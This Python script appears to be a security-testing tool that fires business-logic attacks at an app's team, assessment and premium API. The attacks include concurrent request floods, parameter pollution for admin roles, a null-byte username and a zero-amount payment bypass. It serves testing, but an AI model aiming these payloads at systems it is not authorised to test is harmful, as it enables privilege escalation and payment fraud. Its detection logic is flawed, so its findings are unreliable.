#!/usr/bin/env python3
"""
Advanced Business Logic Attack Patterns
Sophisticated attack scenarios for testing complex business logic vulnerabilities
"""

import requests
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from typing import Dict, List, Any
import uuid

class AdvancedBusinessLogicAttacks:
    def __init__(self, base_url: str, session: requests.Session = None):
        self.base_url = base_url.rstrip('/')
        self.session = session or requests.Session()
        self.attack_results = []

    def race_condition_attacks(self) -> Dict[str, Any]:
        """Test for race conditions in business logic"""
        print("🏁 Testing race condition attacks...")

        attacks = [
            {
                'name': 'Concurrent Team Creation',
                'endpoint': '/api/v1/teams',
                'method': 'POST',
                'data': {'name': 'Race Test Team', 'description': 'Test race condition'},
                'threads': 10,
                'description': 'Multiple simultaneous team creations to bypass limits'
            },
            {
                'name': 'Concurrent Assessment Submission',
                'endpoint': '/api/v1/assessments',
                'method': 'POST',
                'data': {'title': 'Race Assessment', 'type': 'survey'},
                'threads': 15,
                'description': 'Simultaneous assessment submissions to overwhelm validation'
            }
        ]

        results = {}

        for attack in attacks:
            print(f"  🔍 Testing: {attack['name']}")

            def make_request():
                try:
                    response = self.session.post(
                        f"{self.base_url}{attack['endpoint']}",
                        json=attack['data'],
                        timeout=5
                    )
                    return {
                        'status_code': response.status_code,
                        'success': response.status_code in [200, 201],
                        'response': response.text[:200]
                    }
                except Exception as e:
                    return {'error': str(e), 'success': False}

            # Execute concurrent requests
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=attack['threads']) as executor:
                futures = [executor.submit(make_request) for _ in range(attack['threads'])]
                responses = [future.result() for future in as_completed(futures)]

            duration = time.time() - start_time
            successful_requests = [r for r in responses if r.get('success', False)]

            results[attack['name']] = {
                'total_requests': len(responses),
                'successful_requests': len(successful_requests),
                'success_rate': len(successful_requests) / len(responses),
                'duration': duration,
                'requests_per_second': len(responses) / duration,
                'race_condition_detected': len(successful_requests) > 1,  # Multiple successes could indicate race condition
                'sample_responses': successful_requests[:3]
            }

            print(f"    📊 {len(successful_requests)}/{len(responses)} requests successful")

        return results

    def parameter_pollution_attacks(self) -> Dict[str, Any]:
        """Test for HTTP parameter pollution vulnerabilities"""
        print("🔍 Testing parameter pollution attacks...")

        test_cases = [
            {
                'name': 'Role Parameter Pollution',
                'endpoint': '/api/v1/users/me',
                'params': [
                    ('role', 'user'),
                    ('role', 'admin'),  # Try to override with higher privilege
                    ('role', 'owner')
                ]
            },
            {
                'name': 'Team ID Pollution',
                'endpoint': '/api/v1/teams/members',
                'params': [
                    ('team_id', '123'),
                    ('team_id', '999'),  # Try to access different team
                    ('team_id', '1')
                ]
            },
            {
                'name': 'Subscription Level Pollution',
                'endpoint': '/api/v1/premium/features',
                'params': [
                    ('subscription', 'basic'),
                    ('subscription', 'premium'),
                    ('subscription', 'enterprise')
                ]
            }
        ]

        results = {}

        for test in test_cases:
            print(f"  🔍 Testing: {test['name']}")

            try:
                # Test with polluted parameters
                response = self.session.get(
                    f"{self.base_url}{test['endpoint']}",
                    params=test['params']
                )

                # Check if any parameter pollution succeeded
                vulnerability_detected = response.status_code in [200, 201]

                results[test['name']] = {
                    'status_code': response.status_code,
                    'vulnerability_detected': vulnerability_detected,
                    'response_size': len(response.text),
                    'params_tested': test['params'],
                    'response_preview': response.text[:300]
                }

                if vulnerability_detected:
                    print(f"    🚨 Potential parameter pollution vulnerability detected!")

            except Exception as e:
                results[test['name']] = {'error': str(e), 'vulnerability_detected': True}
                print(f"    ❌ Error during test: {e}")

        return results

    def business_logic_bypass_attacks(self) -> Dict[str, Any]:
        """Test for creative business logic bypasses"""
        print("🎭 Testing creative business logic bypass attacks...")

        attacks = [
            {
                'name': 'Negative Value Exploit',
                'endpoint': '/api/v1/teams/members/add',
                'method': 'POST',
                'data': {
                    'team_id': 1,
                    'member_count': -999999,  # Try to overflow/bypass limits
                    'role': 'member'
                },
                'description': 'Use negative values to bypass business logic validation'
            },
            {
                'name': 'Unicode Manipulation',
                'endpoint': '/api/v1/users/update',
                'method': 'PUT',
                'data': {
                    'username': 'admin\u0000',  # Null byte injection
                    'email': 'test@example.com'
                },
                'description': 'Use Unicode characters to bypass validation'
            },
            {
                'name': 'Boolean Logic Abuse',
                'endpoint': '/api/v1/premium/upgrade',
                'method': 'POST',
                'data': {
                    'upgrade': 'true',
                    'payment_confirmed': 'true',  # Try to skip payment
                    'amount': 0,
                    'currency': 'USD'
                },
                'description': 'Manipulate boolean logic to bypass payment validation'
            },
            {
                'name': 'Timestamp Manipulation',
                'endpoint': '/api/v1/reports/schedule',
                'method': 'POST',
                'data': {
                    'schedule_time': (datetime.now() + timedelta(days=365)).isoformat(),  # Far future
                    'immediate': 'true'
                },
                'description': 'Manipulate timestamps to bypass restrictions'
            }
        ]

        results = {}

        for attack in attacks:
            print(f"  🔍 Testing: {attack['name']}")

            try:
                if attack['method'] == 'GET':
                    response = self.session.get(f"{self.base_url}{attack['endpoint']}")
                else:
                    response = self.session.post(
                        f"{self.base_url}{attack['endpoint']}",
                        json=attack['data']
                    )

                vulnerability_detected = response.status_code in [200, 201, 202]

                results[attack['name']] = {
                    'status_code': response.status_code,
                    'vulnerability_detected': vulnerability_detected,
                    'description': attack['description'],
                    'payload': attack['data'],
                    'response_preview': response.text[:200] if response.text else None
                }

                if vulnerability_detected:
                    print(f"    🚨 Business logic bypass successful!")

            except Exception as e:
                results[attack['name']] = {'error': str(e), 'vulnerability_detected': False}
                print(f"    ❌ Error during test: {e}")

        return results

    def indirect_data_access_attacks(self) -> Dict[str, Any]:
        """Test for indirect data access through API relationships"""
        print("🔗 Testing indirect data access attacks...")

        attack_vectors = [
            {
                'name': 'Template Access via Assessment',
                'chain': [
                    ('GET', '/api/v1/assessments/1'),  # Start with accessible assessment
                    ('GET', '/api/v1/assessments/1/template'),  # Try to access template via assessment
                    ('GET', '/api/v1/templates/1/questions')  # Try to access template questions
                ]
            },
            {
                'name': 'User Data via Team Membership',
                'chain': [
                    ('GET', '/api/v1/teams/1/members'),  # Access team members
                    ('GET', '/api/v1/teams/1/members/1/profile'),  # Try to access member profiles
                    ('GET', '/api/v1/teams/1/members/1/assessments')  # Try to access member assessments
                ]
            },
            {
                'name': 'Report Data via Analytics',
                'chain': [
                    ('GET', '/api/v1/analytics/team/1'),  # Access team analytics
                    ('GET', '/api/v1/analytics/team/1/reports'),  # Try to access reports via analytics
                    ('GET', '/api/v1/analytics/team/1/responses')  # Try to access response data
                ]
            }
        ]

        results = {}

        for attack in attack_vectors:
            print(f"  🔍 Testing: {attack['name']}")

            chain_results = []
            current_success = True

            for i, (method, endpoint) in enumerate(attack['chain']):
                try:
                    if method == 'GET':
                        response = self.session.get(f"{self.base_url}{endpoint}")
                    else:
                        response = self.session.post(f"{self.base_url}{endpoint}")

                    step_success = response.status_code in [200, 201]
                    current_success = current_success and step_success

                    chain_results.append({
                        'step': i + 1,
                        'endpoint': endpoint,
                        'method': method,
                        'status_code': response.status_code,
                        'success': step_success,
                        'response_size': len(response.text)
                    })

                    if step_success:
                        print(f"    ✅ Step {i+1}: {endpoint} - SUCCESS")
                    else:
                        print(f"    ❌ Step {i+1}: {endpoint} - FAILED ({response.status_code})")
                        break

                except Exception as e:
                    current_success = False
                    chain_results.append({
                        'step': i + 1,
                        'endpoint': endpoint,
                        'method': method,
                        'error': str(e),
                        'success': False
                    })
                    print(f"    ❌ Step {i+1}: {endpoint} - ERROR")
                    break

            results[attack['name']] = {
                'attack_successful': current_success,
                'chain_depth': len([r for r in chain_results if r.get('success', False)]),
                'total_steps': len(attack['chain']),
                'chain_results': chain_results
            }

            if current_success and len(chain_results) > 1:
                print(f"    🚨 Indirect data access successful! Chain depth: {len(chain_results)}")

        return results

    def workflow_state_abuse_attacks(self) -> Dict[str, Any]:
        """Test for workflow state manipulation and abuse"""
        print("🔄 Testing workflow state abuse attacks...")

        workflows = [
            {
                'name': 'Assessment State Skipping',
                'workflow': [
                    ('POST', '/api/v1/assessments', {'title': 'State Test', 'type': 'survey'}),
                    ('PUT', '/api/v1/assessments/1/state', {'state': 'published'}),  # Skip to published
                    ('PUT', '/api/v1/assessments/1/state', {'state': 'completed'}),  # Skip to completed
                    ('GET', '/api/v1/assessments/1/results')  # Access results without completion
                ]
            },
            {
                'name': 'Team Onboarding Bypass',
                'workflow': [
                    ('POST', '/api/v1/teams', {'name': 'Workflow Test'}),
                    ('PUT', '/api/v1/teams/1/setup', {'setup_complete': True}),  # Skip setup steps
                    ('POST', '/api/v1/teams/1/premium', {'plan': 'enterprise'}),  # Skip payment
                    ('GET', '/api/v1/teams/1/dashboard')  # Access premium features
                ]
            },
            {
                'name': 'User Profile State Manipulation',
                'workflow': [
                    ('POST', '/api/v1/auth/register', {'email': 'statetest@example.com', 'password': 'password123'}),
                    ('PUT', '/api/v1/users/me/verification', {'verified': True}),  # Skip email verification
                    ('PUT', '/api/v1/users/me/subscription', {'plan': 'premium', 'active': True}),  # Skip subscription
                    ('GET', '/api/v1/premium/features')  # Access premium without proper process
                ]
            }
        ]

        results = {}

        for workflow in workflows:
            print(f"  🔍 Testing: {workflow['name']}")

            workflow_results = []
            workflow_success = True
            current_resource_id = None

            for i, (method, endpoint, data) in enumerate(workflow['workflow']):
                try:
                    # Replace IDs in endpoints if needed
                    if current_resource_id and '{id}' in endpoint:
                        endpoint = endpoint.replace('{id}', str(current_resource_id))

                    if method == 'GET':
                        response = self.session.get(f"{self.base_url}{endpoint}")
                    else:
                        response = self.session.request(method, f"{self.base_url}{endpoint}", json=data)

                    step_success = response.status_code in [200, 201, 202]
                    workflow_success = workflow_success and step_success

                    # Extract resource ID for subsequent steps
                    if response.status_code in [200, 201] and 'id' in response.text:
                        try:
                            response_data = response.json()
                            current_resource_id = response_data.get('id')
                        except:
                            pass

                    workflow_results.append({
                        'step': i + 1,
                        'method': method,
                        'endpoint': endpoint,
                        'data': data,
                        'status_code': response.status_code,
                        'success': step_success,
                        'resource_id': current_resource_id
                    })

                    if step_success:
                        print(f"    ✅ Step {i+1}: {method} {endpoint} - SUCCESS")
                    else:
                        print(f"    ❌ Step {i+1}: {method} {endpoint} - FAILED ({response.status_code})")
                        break

                except Exception as e:
                    workflow_success = False
                    workflow_results.append({
                        'step': i + 1,
                        'method': method,
                        'endpoint': endpoint,
                        'data': data,
                        'error': str(e),
                        'success': False
                    })
                    print(f"    ❌ Step {i+1}: {method} {endpoint} - ERROR")
                    break

            results[workflow['name']] = {
                'workflow_abuse_successful': workflow_success,
                'steps_completed': len([r for r in workflow_results if r.get('success', False)]),
                'total_steps': len(workflow['workflow']),
                'workflow_results': workflow_results
            }

            if workflow_success and len(workflow_results) > 1:
                print(f"    🚨 Workflow state abuse successful! {len(workflow_results)} steps completed")

        return results

    def run_all_advanced_attacks(self) -> Dict[str, Any]:
        """Execute all advanced business logic attack patterns"""
        print("🚀 Starting advanced business logic attack testing...")
        print("=" * 60)

        all_results = {
            'test_start_time': datetime.now().isoformat(),
            'target_url': self.base_url,
            'attack_categories': {}
        }

        # Run all attack categories
        attack_methods = [
            ('Race Condition Attacks', self.race_condition_attacks),
            ('Parameter Pollution Attacks', self.parameter_pollution_attacks),
            ('Business Logic Bypass Attacks', self.business_logic_bypass_attacks),
            ('Indirect Data Access Attacks', self.indirect_data_access_attacks),
            ('Workflow State Abuse Attacks', self.workflow_state_abuse_attacks)
        ]

        for category_name, attack_method in attack_methods:
            try:
                print(f"\\n🎯 Executing {category_name}...")
                results = attack_method()
                all_results['attack_categories'][category_name] = results

                # Count vulnerabilities found
                if isinstance(results, dict):
                    vuln_count = sum(1 for r in results.values()
                                    if isinstance(r, dict) and r.get('vulnerability_detected', False) or r.get('attack_successful', False))
                    print(f"  📊 {category_name}: {vuln_count} potential vulnerabilities found")

            except Exception as e:
                print(f"  ❌ Error executing {category_name}: {e}")
                all_results['attack_categories'][category_name] = {'error': str(e)}

        all_results['test_end_time'] = datetime.now().isoformat()

        print(f"\\n✅ Advanced attack testing completed!")
        return all_results

    def generate_advanced_report(self, results: Dict[str, Any]) -> str:
        """Generate comprehensive advanced attack report"""
        report = []
        report.append("# Advanced Business Logic Security Assessment Report")
        report.append(f"**Target:** {results.get('target_url', 'Unknown')}")
        report.append(f"**Assessment Date:** {results.get('test_start_time', 'Unknown')}")
        report.append("")

        # Executive Summary
        total_vulnerabilities = 0
        for category, category_results in results.get('attack_categories', {}).items():
            if isinstance(category_results, dict):
                for test_name, test_results in category_results.items():
                    if isinstance(test_results, dict):
                        if test_results.get('vulnerability_detected') or test_results.get('attack_successful'):
                            total_vulnerabilities += 1

        report.append("## Executive Summary")
        report.append(f"- **Total Attack Categories Tested:** {len(results.get('attack_categories', {}))}")
        report.append(f"- **Total Vulnerabilities Found:** {total_vulnerabilities}")
        report.append(f"- **Risk Level:** {'CRITICAL' if total_vulnerabilities > 10 else 'HIGH' if total_vulnerabilities > 5 else 'MEDIUM' if total_vulnerabilities > 0 else 'LOW'}")
        report.append("")

        # Detailed Results by Category
        report.append("## Detailed Attack Results")

        for category_name, category_results in results.get('attack_categories', {}).items():
            report.append(f"\\n### {category_name}")

            if isinstance(category_results, dict) and 'error' in category_results:
                report.append(f"**Error:** {category_results['error']}")
                continue

            if isinstance(category_results, dict):
                for test_name, test_results in category_results.items():
                    if isinstance(test_results, dict):
                        status = "🚨 VULNERABLE" if (test_results.get('vulnerability_detected') or test_results.get('attack_successful')) else "✅ SECURE"
                        report.append(f"\\n#### {test_name} - {status}")

                        # Add key findings
                        if test_results.get('vulnerability_detected') or test_results.get('attack_successful'):
                            report.append("**Risk Level:** HIGH")
                            if 'description' in test_results:
                                report.append(f"**Description:** {test_results['description']}")

                        # Add key metrics
                        for key, value in test_results.items():
                            if key not in ['vulnerability_detected', 'attack_successful', 'description', 'response_preview', 'payload']:
                                if isinstance(value, (int, float, str)):
                                    report.append(f"**{key.replace('_', ' ').title()}:** {value}")

        return "\\n".join(report)

def main():
    """Main execution function"""
    print("🎭 Advanced Business Logic Attack Tester")
    print("=" * 50)

    base_url = input("Enter target URL (e.g., http://localhost:8000): ").strip()
    if not base_url:
        base_url = "http://localhost:8000"

    # Create attacker instance
    attacker = AdvancedBusinessLogicAttacks(base_url)

    try:
        # Run all advanced attacks
        results = attacker.run_all_advanced_attacks()

        # Generate report
        report = attacker.generate_advanced_report(results)

        # Save report
        filename = f"advanced_business_logic_attacks_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        with open(filename, 'w') as f:
            f.write(report)

        print(f"\\n📄 Advanced attack report saved to: {filename}")

        # Print summary
        print("\\n" + "=" * 50)
        print("🏁 Advanced Attack Testing Complete")
        print("=" * 50)

        total_vulns = 0
        for category, category_results in results.get('attack_categories', {}).items():
            if isinstance(category_results, dict):
                for test_name, test_results in category_results.items():
                    if isinstance(test_results, dict):
                        if test_results.get('vulnerability_detected') or test_results.get('attack_successful'):
                            total_vulns += 1

        print(f"Advanced Vulnerabilities Found: {total_vulns}")

        if total_vulns > 0:
            print("\\n🚨 CRITICAL: Advanced business logic vulnerabilities detected!")
            print("   These could allow sophisticated attackers to bypass security controls")
        else:
            print("\\n✅ No advanced business logic vulnerabilities detected")

    except KeyboardInterrupt:
        print("\\n⚠️  Attack testing interrupted by user")
    except Exception as e:
        print(f"\\n❌ Attack testing error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
